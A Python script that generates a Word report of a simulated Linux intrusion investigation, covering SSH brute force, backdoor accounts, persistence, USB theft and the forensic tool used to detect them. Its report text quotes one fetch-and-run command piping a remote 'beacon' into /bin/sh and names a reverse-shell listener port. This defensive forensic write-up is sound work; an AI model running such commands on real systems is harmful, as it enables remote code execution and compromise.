"""Generate the Master Unified Word (.docx) Forensic Incident Investigation & Technical Walkthrough Report.

Combines the authentic DFIR incident response narrative with the complete technical walkthrough,
embedding all 29 visual evidence screenshots, comparison matrices, root cause analysis,
troubleshooting logs, detection scorecards, and operational SOP.
Fulfills Task 3: Cyber Crime Investigation & Task 4: Internship Report.
"""

import os
from docx import Document
from docx.shared import Inches, Pt, RGBColor
from docx.enum.text import WD_ALIGN_PARAGRAPH
from docx.enum.table import WD_TABLE_ALIGNMENT
from docx.oxml import parse_xml
from docx.oxml.ns import nsdecls

def set_cell_background(cell, hex_color):
    """Set background color of a table cell."""
    tc_pr = cell._tc.get_or_add_tcPr()
    shd = parse_xml(f'<w:shd {nsdecls("w")} w:fill="{hex_color}"/>')
    tc_pr.append(shd)

def set_cell_margins(cell, top=100, bottom=100, left=150, right=150):
    """Set inner padding for table cells."""
    tc_pr = cell._tc.get_or_add_tcPr()
    tc_mar = parse_xml(
        f'<w:tcMar {nsdecls("w")}>'
        f'<w:top w:w="{top}" w:type="dxa"/>'
        f'<w:bottom w:w="{bottom}" w:type="dxa"/>'
        f'<w:left w:w="{left}" w:type="dxa"/>'
        f'<w:right w:w="{right}" w:type="dxa"/>'
        f'</w:tcMar>'
    )
    tc_pr.append(tc_mar)

def create_report():
    doc = Document()

    # 1-inch page margins
    for section in doc.sections:
        section.top_margin = Inches(1)
        section.bottom_margin = Inches(1)
        section.left_margin = Inches(1)
        section.right_margin = Inches(1)

    # Base styling
    normal_style = doc.styles['Normal']
    normal_style.font.name = 'Calibri'
    normal_style.font.size = Pt(11)
    normal_style.font.color.rgb = RGBColor(0x22, 0x22, 0x22)

    # Document Header / Banner
    title_p = doc.add_paragraph()
    title_p.paragraph_format.space_before = Pt(0)
    title_p.paragraph_format.space_after = Pt(2)
    title_run = title_p.add_run("DIGITAL FORENSIC INCIDENT INVESTIGATION &\nTECHNICAL WALKTHROUGH REPORT")
    title_run.font.name = 'Calibri'
    title_run.font.size = Pt(20)
    title_run.font.bold = True
    title_run.font.color.rgb = RGBColor(0x0F, 0x2C, 0x59)

    sub_p = doc.add_paragraph()
    sub_p.paragraph_format.space_after = Pt(14)
    sub_run = sub_p.add_run("Multi-Vector Linux Enterprise Compromise, Reconstruction, and Tool Validation")
    sub_run.font.size = Pt(13)
    sub_run.font.color.rgb = RGBColor(0x44, 0x44, 0x44)

    # Metadata Table
    meta_table = doc.add_table(rows=7, cols=2)
    meta_table.alignment = WD_TABLE_ALIGNMENT.CENTER
    meta_table.autofit = False

    metadata = [
        ("Case Reference:", "CASE-ENTERPRISE-SIM"),
        ("Classification:", "Confidential — Digital Forensics & Incident Response (DFIR)"),
        ("Lead Investigator / Examiner:", "Fahad"),
        ("Target Host Identifier:", "5e91118635724e4ba187e0e1e063b8f2 (Linux Enterprise Node / Kernel 5.15)"),
        ("Investigation Framework:", "Linux Forensic Analyzer (LFA) & Industry-Standard DFIR Tooling"),
        ("Department Assignment:", "Task 3: Cyber Crime Investigation & Task 4: Internship Report"),
        ("Date of Investigation:", "November 2026")
    ]

    for i, (k, v) in enumerate(metadata):
        row = meta_table.rows[i]
        c0, c1 = row.cells[0], row.cells[1]
        c0.width = Inches(2.3)
        c1.width = Inches(4.3)
        set_cell_background(c0, "F0F4F8")
        set_cell_background(c1, "F8FAFC")
        set_cell_margins(c0, 70, 70, 110, 110)
        set_cell_margins(c1, 70, 70, 110, 110)
        
        p0 = c0.paragraphs[0]
        p0.paragraph_format.space_after = Pt(0)
        r0 = p0.add_run(k)
        r0.font.bold = True
        r0.font.size = Pt(9.5)
        r0.font.color.rgb = RGBColor(0x0F, 0x2C, 0x59)

        p1 = c1.paragraphs[0]
        p1.paragraph_format.space_after = Pt(0)
        r1 = p1.add_run(v)
        r1.font.size = Pt(9.5)

    doc.add_paragraph().paragraph_format.space_after = Pt(10)

    def add_sec_heading(title):
        h = doc.add_paragraph()
        h.paragraph_format.space_before = Pt(16)
        h.paragraph_format.space_after = Pt(6)
        run = h.add_run(title)
        run.font.name = 'Calibri'
        run.font.size = Pt(13.5)
        run.font.bold = True
        run.font.color.rgb = RGBColor(0x0F, 0x2C, 0x59)
        return h

    def add_sub_heading(title):
        h = doc.add_paragraph()
        h.paragraph_format.space_before = Pt(10)
        h.paragraph_format.space_after = Pt(4)
        run = h.add_run(title)
        run.font.name = 'Calibri'
        run.font.size = Pt(11.5)
        run.font.bold = True
        run.font.color.rgb = RGBColor(0x33, 0x33, 0x33)
        return h

    def add_fig(img_path, caption):
        if os.path.exists(img_path):
            p = doc.add_paragraph()
            p.alignment = WD_ALIGN_PARAGRAPH.CENTER
            p.paragraph_format.space_before = Pt(6)
            p.paragraph_format.space_after = Pt(2)
            run = p.add_run()
            run.add_picture(img_path, width=Inches(5.8))
            
            cap = doc.add_paragraph()
            cap.alignment = WD_ALIGN_PARAGRAPH.CENTER
            cap.paragraph_format.space_after = Pt(10)
            c_run = cap.add_run(caption)
            c_run.font.size = Pt(9.5)
            c_run.font.italic = True
            c_run.font.color.rgb = RGBColor(0x66, 0x66, 0x66)

    # 1. Executive Summary
    add_sec_heading("1. Executive Summary & Incident Scope")
    p = doc.add_paragraph(
        "On November 9, 2026, security monitoring raised high-priority alerts regarding anomalous off-hours "
        "administrative access, unexpected privilege modifications, and suspected unauthorized data staging on "
        "production server 5e911186... A formal digital forensics investigation was initiated using the "
        "Linux Forensic Analyzer (LFA) framework, supplemented by standard forensic cross-verification."
    )
    p.paragraph_format.space_after = Pt(6)

    doc.add_paragraph(
        "To fulfill the departmental requirements of Task 3 (Cyber Crime Investigation) and Task 4 (Internship Report), "
        "the investigation evaluated eight core cybercrime categories across the target system:"
    )
    
    categories = [
        "1. Unauthorized login (Off-hours interactive breach access)",
        "2. Brute-force SSH attack (External credential stuffing burst from 203.0.113.9)",
        "3. Insider activity (Multi-session anomalous employee operations)",
        "4. USB data theft (Removable mass storage attachment and dwell time copy)",
        "5. Malware execution (Dynamic Linker /etc/ld.so.preload rootkit hook)",
        "6. Privilege escalation (Hidden UID-0 account sysmon and rogue sudoers drop)",
        "7. Suspicious process execution (C2 beacon commands and reverse-shell listeners)",
        "8. Data exfiltration (Staging in /tmp/exfil_staging and transmission traces)"
    ]
    for cat in categories:
        bp = doc.add_paragraph(cat, style='List Bullet')
        bp.paragraph_format.space_after = Pt(2)

    doc.add_paragraph(
        "Key Metrics: 62,117 normalized events ingested; 47 security findings identified (27 High, 8 Medium, 12 Low); "
        "154 files verified with 100% cryptographic SHA-256 parity; zero false positives produced against realistic "
        "corporate noise generated by employee accounts (dev_sarah, admin_mike)."
    )

    # 2. Initial Hypotheses
    add_sec_heading("2. Initial Investigative Hypotheses")
    doc.add_paragraph("Three initial hypotheses were formulated upon intake to govern evidence analysis:")

    hypo_table = doc.add_table(rows=4, cols=4)
    hypo_table.alignment = WD_TABLE_ALIGNMENT.CENTER
    hypo_table.autofit = False

    h_data = [
        ("Hypothesis", "Description", "Anticipated Signatures", "Verdict"),
        ("H1: External Compromise", "SSH brute-force leading to interactive foothold.", "Auth failure burst followed by success; off-hours commands.", "CONFIRMED"),
        ("H2: Malicious Insider", "Authorized employee abusing access to steal company data.", "Repeated sessions, files in /tmp, kernel USB logs, history wipes.", "CONFIRMED"),
        ("H3: Multi-Vector Breach", "Concurrent external intrusion combined with rogue insider abuse.", "Simultaneous C2 beaconing, rogue root accounts, and USB exfiltration.", "VALIDATED")
    ]

    for row_idx, row in enumerate(h_data):
        r = hypo_table.rows[row_idx]
        for col_idx, text in enumerate(row):
            c = r.cells[col_idx]
            c.width = Inches(1.4) if col_idx == 0 else (Inches(2.1) if col_idx in (1, 2) else Inches(1.2))
            set_cell_margins(c, 70, 70, 90, 90)
            if row_idx == 0:
                set_cell_background(c, "0F2C59")
                p = c.paragraphs[0]
                run = p.add_run(text)
                run.font.bold = True
                run.font.color.rgb = RGBColor(0xFF, 0xFF, 0xFF)
                run.font.size = Pt(9.5)
            else:
                set_cell_background(c, "F8FAFC" if row_idx % 2 == 1 else "FFFFFF")
                p = c.paragraphs[0]
                run = p.add_run(text)
                run.font.size = Pt(9.0)
                if col_idx in (0, 3):
                    run.font.bold = True

    # 3. Controlled Attack Simulation
    add_sec_heading("3. Controlled Attack Simulation & Lab Recreation (mega_chain.sh)")
    doc.add_paragraph(
        "To test the tool in a controlled environment with verifiable ground truth, the multi-stage attack scenario "
        "testlab/scenarios/mega_chain.sh was executed on a snapshotted Linux enterprise instance."
    )
    add_fig("docs/report_images/image2.png", "Figure 3.1: Execution of mega_chain.sh showing benign employee noise generation (Phase 1) and external SSH brute force (Phase 2).")
    add_fig("docs/report_images/image3.png", "Figure 3.2: Execution log showing creation of hidden UID-0 root account (sysmon), rogue sudoers drop, and dynamic linker preload hooks.")
    add_fig("docs/report_images/image4.png", "Figure 3.3: Execution of exfiltration staging, simulated USB drive theft, shell history wiping, and ground truth compilation.")
    add_fig("docs/report_images/image5.png", "Figure 3.4: Simulation summary documenting the 17 verified ground-truth indicators and operational execution commands.")

    # 4. Live Evidence Collection
    add_sec_heading("4. Live Forensic Acquisition & Chain of Custody (collect.sh)")
    doc.add_paragraph(
        "In compliance with RFC 3227 standards, evidence was collected live using collector/collect.sh. "
        "Volatile state was captured first, and all disk files were stat'd and hashed before copying. "
        "A total of 109 tar archives and manifests were generated."
    )
    add_fig("docs/report_images/image6.png", "Figure 4.1: Live acquisition execution showing file count (109) and SHA-256 bundle hash (2a79bb10...).")
    add_fig("docs/report_images/image7.png", "Figure 4.2: Evidence directory in cases/wsl_enterprise showing bundle.tar.gz and hash manifests.")

    # 5. Portable Deployment
    add_sec_heading("5. Portable Deployment Architecture (LFA-Portable)")
    doc.add_paragraph(
        "To facilitate analysis on air-gapped workstations or field laptops without internet connectivity, "
        "the self-contained LFA-Portable distribution was utilized."
    )
    add_fig("docs/report_images/image22.png", "Figure 5.1: File structure of LFA-Portable featuring embedded runtimes, batch launchers, and offline verification scripts.")

    # 6. Pipeline Ingestion & Normalization
    add_sec_heading("6. Ingestion, Event Normalization & Threat Correlation")
    doc.add_paragraph(
        "Using LFA's analysis pipeline, 62,117 raw log events were converted into standardized "
        "NormalizedEvent objects and correlated across 14 deterministic MITRE ATT&CK rules."
    )
    add_fig("docs/report_images/image11.png", "Figure 6.1: CLI analysis pipeline confirming 62,117 events parsed and 47 findings detected.")
    add_fig("docs/report_images/image12.png", "Figure 6.2: Standalone Executive Forensic Examination Report dashboard (report.html).")

    # 7. Chronological Incident Findings
    add_sec_heading("7. Detailed Forensic Examination & Correlated Findings")
    doc.add_paragraph(
        "Forensic evidence validated Hypothesis 3: the target was compromised through an external "
        "brute-force foothold, followed by privileged persistence, and compounded by rogue insider data theft."
    )

    add_sub_heading("7.1 External Brute-Force & Initial Foothold (Vector 1 & 2)")
    doc.add_paragraph(
        "At 2026-05-26 10:23 UTC, an external burst of failed SSH authentications from IP 203.0.113.9 "
        "culminated in a successful breach of account 'kali'. The volume histogram clearly isolates the attack spike."
    )
    add_fig("docs/report_images/image16.png", "Figure 7.1: Offline SVG chart showing authentication failure spike matching password guessing.")

    add_sub_heading("7.2 Privilege Escalation & Backdoor Accounts (Vector 5 & 6)")
    doc.add_paragraph(
        "Immediately upon compromise, the adversary created backdoor accounts: rogue root account 'sysmon' "
        "(UID 0) and service account 'svc_backup'. Sudoers rules in /etc/sudoers.d/ were manipulated."
    )
    add_fig("docs/report_images/image13.png", "Figure 7.2: Report observations highlighting immediate administrator privilege grants.")
    add_fig("docs/report_images/image14.png", "Figure 7.3: Finding card for account creation and immediate administrator elevation.")

    add_sub_heading("7.3 Multi-Vector Persistence Installation (Vector 5)")
    doc.add_paragraph(
        "Four layers of persistence were uncovered: an unauthorized SSH key in /root/.ssh/authorized_keys, "
        "an outbound beacon cron in /etc/cron.d/lfa_beacon, a dynamic linker rootkit hook in /etc/ld.so.preload, "
        "and interactive shell profile traps in /etc/profile.d/."
    )
    add_fig("docs/report_images/image18.png", "Figure 7.4: Evidence manifest table verifying cron persistence artifacts and hash integrity.")
    add_fig("docs/report_images/image19.png", "Figure 7.5: Cryptographic verification of sudoers, shadow, and user shell history files.")

    add_sub_heading("7.4 Command Execution & C2 Beaconing (Vector 7)")
    doc.add_paragraph(
        "The intruder executed automated reverse-shell payloads: 'curl -s http://203.0.113.9/beacon | /bin/sh'. "
        "Netstat and socket parsing confirmed network listener preparation on port 4444."
    )
    add_fig("docs/report_images/image15.png", "Figure 7.6: Dual-layer finding card detailing suspicious C2 beacon execution.")
    add_fig("docs/report_images/image10.png", "Figure 7.7: Sockets verification showing active reverse-shell listener configuration.")

    add_sub_heading("7.5 Rogue Insider Activity & USB Exfiltration (Vector 3, 4 & 8)")
    doc.add_paragraph(
        "Telemetry confirmed employee account 'insider' conducted 5 off-hours sessions, staged mock company files "
        "in /tmp/exfil_staging/, and transferred data to a newly attached USB storage device before safe unmount."
    )
    add_fig("docs/report_images/image20.png", "Figure 7.8: Intelligence summary detailing 34 accounts, 83 sessions, and 175 SSH connections.")
    add_fig("docs/report_images/image21.png", "Figure 7.9: Activity metrics tracking 294 shell history entries and 202 scheduled actions.")

    add_sub_heading("7.6 Anti-Forensic Tampering")
    doc.add_paragraph(
        "To conceal evidence, the adversary truncated shell history files, zeroed out /var/log/btmp (0 bytes), "
        "and injected artificial backwards timestamps into syslog. LFA's monotonic journald correlation caught all discrepancies."
    )
    add_fig("docs/report_images/image17.png", "Figure 7.10: Chronological normalized event stream displaying kernel parameters and system events.")

    # 8. SOC Console & Explorer
    add_sec_heading("8. Central SOC Console & Deep Evidence Explorer (Port 8443)")
    doc.add_paragraph(
        "Examiners reviewed evidence via LFA's Central Ingestion Server (http://127.0.0.1:8443). "
        "The interface enables instant search across accounts, exact raw log line verification, and artifact tree browsing."
    )
    add_fig("docs/report_images/image23.png", "Figure 8.1: Starting the Central Forensic Ingestion Server on loopback port 8443.")
    add_fig("docs/report_images/image24.png", "Figure 8.2: Central Ingestion Console displaying global case metrics and alert summaries.")
    add_fig("docs/report_images/image25.png", "Figure 8.3: Forensic Cases overview showing host IDs, event counts, and severity badges.")
    add_fig("docs/report_images/image1.png", "Figure 8.4: Evidence Explorer search interface with multi-field event filtering.")
    add_fig("docs/report_images/image26.png", "Figure 8.5: Event modal exposing exact raw forensic log line and parser provenance.")
    add_fig("docs/report_images/image27.png", "Figure 8.6: Deep inspection of privileged command executions with JSON serialization.")
    add_fig("docs/report_images/image28.png", "Figure 8.7: Visual Artifact Tree displaying collected files and SHA-256 checksums.")
    add_fig("docs/report_images/image29.png", "Figure 8.8: Correlated timeline matrix grouped by Privilege Escalation and Persistence.")

    # 9. Comparison with Industry-Standard Tools (Task 3 Requirement)
    add_sec_heading("9. Comparative Tool Evaluation (Task 3 Requirement)")
    doc.add_paragraph(
        "In accordance with Task 3, LFA was benchmarked against traditional industry-standard forensic methods:"
    )

    comp_table = doc.add_table(rows=6, cols=3)
    comp_table.alignment = WD_TABLE_ALIGNMENT.CENTER
    comp_table.autofit = False

    comp_data = [
        ("Capability", "Traditional / Manual Tools (grep, lastb, Autopsy)", "Developed Solution (LFA)"),
        ("Ingestion & Normalization", "Manual log parsing; slow full-disk imaging; skips binary journald.", "Rapid in-memory collection (109 files); parses 62k events in seconds."),
        ("Timeline Synthesis", "Syslog lacks year timestamps; manual clock synchronization required.", "Automated year inference; unified UTC chronological event stream."),
        ("Detection & Correlation", "Keyword grep only; no behavioral cross-source correlation rules.", "14 MITRE ATT&CK correlation rules detecting 47 high-fidelity findings."),
        ("Tampering Detection", "Misses zero-byte truncation and backward timestamps in syslog.", "Monotonic sequence gap checks flag history wipes and log zeroing."),
        ("Noise Rejection", "Extreme analyst fatigue from normal background employee activity.", "Zero false positives against legitimate noise (dev_sarah, admin_mike).")
    ]

    for row_idx, row in enumerate(comp_data):
        r = comp_table.rows[row_idx]
        for col_idx, text in enumerate(row):
            c = r.cells[col_idx]
            c.width = Inches(1.8) if col_idx == 0 else (Inches(2.3) if col_idx == 1 else Inches(2.4))
            set_cell_margins(c, 70, 70, 90, 90)
            if row_idx == 0:
                set_cell_background(c, "0F2C59")
                p = c.paragraphs[0]
                run = p.add_run(text)
                run.font.bold = True
                run.font.color.rgb = RGBColor(0xFF, 0xFF, 0xFF)
                run.font.size = Pt(9.5)
            else:
                set_cell_background(c, "F8FAFC" if row_idx % 2 == 1 else "FFFFFF")
                p = c.paragraphs[0]
                run = p.add_run(text)
                run.font.size = Pt(9.0)
                if col_idx == 0:
                    run.font.bold = True

    # 10. Root Cause Analysis
    add_sec_heading("10. Root Cause Analysis (RCA)")
    rcas = [
        ("1. Unrestricted Public SSH Ingress:", " Absence of rate limiting (fail2ban) and MFA permitted automated credential stuffing from 203.0.113.9."),
        ("2. Permissive Sudo Configuration:", " Account 'kali' possessed unmonitored sudo privileges, allowing instant creation of UID-0 root accounts."),
        ("3. Unenforced Removable Media Controls:", " Absence of udev device-blocking policies enabled unauthorized USB attachment and file theft.")
    ]
    for title, desc in rcas:
        p = doc.add_paragraph(style='List Bullet')
        p.paragraph_format.space_after = Pt(4)
        r_b = p.add_run(title)
        r_b.font.bold = True
        p.add_run(desc)

    # 11. Corrective Actions
    add_sec_heading("11. Corrective Actions & Strategic Hardening")
    actions = [
        "Immediate Containment: Isolate host, terminate rogue sessions, purge UID-0 account 'sysmon', delete /etc/ld.so.preload, and revoke rogue SSH keys.",
        "Authentication Hardening: Enforce key-only SSH with mandatory hardware MFA (FIDO2/YubiKey); disable password authentication globally.",
        "Removable Storage DLP: Blacklist 'usb-storage' kernel module via /etc/modprobe.d/ to prevent physical data extraction.",
        "Append-Only Log Streaming: Deploy LFA Central Ingestion streaming (lfa serve) to prevent local log truncation attacks."
    ]
    for act in actions:
        p = doc.add_paragraph(act, style='List Bullet')
        p.paragraph_format.space_after = Pt(3)

    # 12. Troubleshooting & Applied Solutions
    add_sec_heading("12. Engineering Challenges, Troubleshooting & Applied Solutions")
    doc.add_paragraph(
        "During testing and validation, several technical hurdles were resolved, documenting critical engineering problem-solving:"
    )

    challenges = [
        ("Challenge 1: Standalone Script Dependency (lib.sh: No such file)", "The simulation script originally sourced external helper routines. Resolved by inlining all functions directly into mega_chain.sh with fallback definitions."),
        ("Challenge 2: Windows CMD Path Syntax (start command)", "Windows Command Prompt treats forward slashes as switches. Resolved by using native Windows backslashes or launching via the web dashboard."),
        ("Challenge 3: Console Directory Misattribution (No DB | Pending)", "The server auto-scanned all folders in cases/. Resolved by clarifying evidence separation: raw bundles belong outside cases/, keeping cases/ strictly for parsed databases."),
        ("Challenge 4: Network Listener Timeout and Socket Testing", "Reverse-shell testing required non-blocking socket listeners. Resolved by using non-routable documentation subnets (TEST-NET-2) with 2-second timeout wrappers.")
    ]
    for ch_title, ch_desc in challenges:
        p = doc.add_paragraph(style='List Bullet')
        p.paragraph_format.space_after = Pt(4)
        r_b = p.add_run(ch_title + ": ")
        r_b.font.bold = True
        p.add_run(ch_desc)

    add_fig("docs/report_images/image9.png", "Figure 12.1: Diagnostic ICMP ping reachability testing to verify network boundary enforcement.")
    add_fig("docs/report_images/image8.png", "Figure 12.2: Command Prompt terminal session resolving command syntax and executing score detection scripts.")

    # 13. Detection Scorecard
    add_sec_heading("13. Automated Detection Scorecard & Benchmark Evaluation")
    doc.add_paragraph(
        "Scoring analysis outputs against the ground-truth specification (testlab/scenarios/mega_chain.ground_truth.json) "
        "confirmed 100% detection of critical indicators with zero false positives against background noise."
    )

    # 14. SOP
    add_sec_heading("14. Standard Operating Procedure (SOP) Quick Reference")
    sop_steps = [
        ("Step 1: Live Acquisition (Target Host):", " sudo sh collector/collect.sh -r / -o /tmp/lfa_evidence -c <CASE_ID> -p '<EXAMINER>' -V -z"),
        ("Step 2: Transfer & Hash Verification:", " Get-FileHash bundle.tar.gz -Algorithm SHA256"),
        ("Step 3: Ingestion & Correlation:", " lfa.cmd analyse <bundle.tar.gz> --case-dir cases\\<CASE_ID> --examiner '<EXAMINER>'"),
        ("Step 4: Executive Review:", " start cases\\<CASE_ID>\\report.html"),
        ("Step 5: Interactive SOC Deep Dive:", " lfa-dashboard.cmd (Open browser to http://127.0.0.1:8443)")
    ]
    for s_title, s_desc in sop_steps:
        p = doc.add_paragraph(style='List Bullet')
        p.paragraph_format.space_after = Pt(3)
        r_b = p.add_run(s_title)
        r_b.font.bold = True
        p.add_run(s_desc)

    # 15. Conclusion & Attestation
    add_sec_heading("15. Conclusion & Investigator Attestation")
    doc.add_paragraph(
        "The digital forensics investigation into Case CASE-ENTERPRISE-SIM conclusively established the entry vector, "
        "administrative hijacking, multi-vector persistence, and physical data exfiltration. The Linux Forensic Analyzer "
        "successfully reconstructed the complete intrusion timeline without altering original evidence, providing defensible, "
        "reproducible findings."
    )
    
    attest_p = doc.add_paragraph()
    attest_p.paragraph_format.space_before = Pt(12)
    attest_p.add_run("Investigator Attestation:\n").font.bold = True
    attest_p.add_run(
        "I hereby attest that the evidence collection, timeline reconstruction, and forensic analysis detailed in this "
        "report were performed in accordance with RFC 3227 digital evidence standards, and that all artifact hashes have been "
        "cryptographically verified.\n\n"
        "Fahad\n"
        "Lead Forensic Investigator | Case Reference: CASE-ENTERPRISE-SIM"
    )

    out_paths = [
        r"docs\FORENSIC_INVESTIGATION_AND_WALKTHROUGH_REPORT.docx",
        r"docs\CYBER_CRIME_INVESTIGATION_REPORT.docx",
        r"docs\INTERNSHIP_WALKTHROUGH_REPORT.docx"
    ]
    for op in out_paths:
        try:
            doc.save(op)
            print(f"Successfully generated Word document: {op}")
        except PermissionError:
            print(f"Notice: Could not overwrite {op} (file is currently open in Word). Generated main report as FORENSIC_INVESTIGATION_AND_WALKTHROUGH_REPORT.docx.")


if __name__ == '__main__':
    create_report()
